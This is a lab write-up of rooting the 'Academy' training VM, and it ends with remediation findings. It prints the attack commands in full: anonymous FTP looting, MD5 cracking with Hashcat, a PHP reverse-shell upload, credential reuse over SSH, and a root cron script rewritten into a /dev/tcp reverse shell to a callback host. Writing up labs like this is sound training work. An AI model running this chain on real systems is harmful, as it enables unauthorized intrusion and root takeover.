Academy

On this page ⌄

Overview

  • Target: Academy
  • OS: Debian GNU/Linux, kernel 4.19.0-16-amd64, x86_64
  • Service: FTP, SSH and an Academy PHP web application
  • Attack: Anonymous FTP note, cracked password, PHP upload shell, reused credential, root-run backup script
  • Scope: Intentionally vulnerable, isolated training VM

I chained an exposed FTP note, a cracked password, a PHP upload, a reused database credential and a writable root backup script to take Academy to root.

Reconnaissance

Placeholders such as <TARGET_IP> stand in for lab addresses. I scanned every port:

sudo nmap -p- -sC -sV -T4 <TARGET_IP> -oN academy_nmap.txt

FTP was open, so I logged in anonymously, listed the directory and downloaded note.txt:

ftp <TARGET_IP>
ls
get note.txt
bye
cat note.txt

Initial access

The note held an SQL insert for a student account with a password hash. It said the student registration number was the login, and that Grimmie used the same password everywhere. hash-identifier pointed to MD5, and Hashcat with rockyou cracked it in under a second:

hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
Status...........: Cracked
Hash.Mode........: 0 (MD5)

I logged in to the student application with the registration number and the recovered password. FFUF mapped the web directories, including /academy/ and its student profile image upload:

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-u http://<TARGET_IP>/FUZZ -ac

I uploaded a PHP reverse shell as my profile photo through the Academy PHP upload, requested it, and caught the callback as www-data:

nc -lvnp 1234
whoami

I upgraded the shell to interactive Bash:

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

Privilege escalation

I ran LinPEAS. It pointed to /home/grimmie/backup.sh and the web application’s database configuration.

cd /tmp
wget http://<CALLBACK_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

The web configuration held the MySQL login, and its user was grimmie. The FTP note said Grimmie reused passwords, so I tried that password over SSH. It worked. This was an account change on the same host, not lateral movement.

cat /var/www/html/academy/includes/config.php
$mysql_user = "grimmie";

ssh grimmie@<TARGET_IP>
grimmie@academy:~$ whoami
grimmie

The backup script zipped the web includes folder into /tmp/backup.zip. systemctl list-timers showed no timer for it, so I watched processes with pspy64, which needs no root access. Every minute, CRON ran /bin/bash /home/grimmie/backup.sh as UID=0: a root task ran a script my account could change.

cat /home/grimmie/backup.sh
#!/bin/bash
rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip

systemctl list-timers
./pspy64

I started a second listener and edited the script to open a reverse shell:

nc -lvnp 8080
# In the grimmie session:
nano backup.sh
cat backup.sh
#!/bin/bash
bash -i >& /dev/tcp/<CALLBACK_IP>/8080 0>&1

Result

Result: Root access achieved

Root ran my modified backup script. The listener on port 8080 caught the callback, and whoami returned root.

Attack path

  1. Anonymous FTP note
  2. Credential recovery
  3. Academy PHP upload
  4. www-data
  5. SSH as grimmie
  6. Writable backup script that runs as root
  7. Root

Remediation

Finding

Sensitive account information on anonymous FTP

Anonymous access exposed a student account note that led to credential recovery. The issue is unauthorized access to sensitive content, not the open FTP port itself.

Fix

Remove sensitive files and backups from the anonymous area, and disable anonymous FTP if it isn’t needed or confine it to a public-only directory. Reset exposed credentials and review the logs. Replace fast legacy password hashing with a vetted algorithm such as Argon2id. Encrypted file transfer protects data in transit but does not fix anonymous access.

Finding

Executable profile upload

The profile photo upload accepted a PHP reverse shell and ran it as www-data.

Fix

Allowlist expected image formats, verify file contents, store uploads outside executable paths and prevent script execution in upload storage.

Finding

Credential reuse

A database credential from the web configuration also opened SSH as grimmie.

Fix

Separate application, database and operating system credentials, restrict configuration access and rotate the exposed credential.

Finding

Writable privileged script

Root ran a backup script that grimmie could modify.

Fix

Make privileged scripts and their parent directories writable only by their privileged owner, and run scheduled tasks with the least privilege they need.

Key takeaways

  • Anonymous FTP is only as safe as the files left in it.
  • The MD5 password hash fell to Hashcat and a wordlist in under a second.
  • pspy reveals root jobs without root; a root job that runs a user-writable script is a path to root.
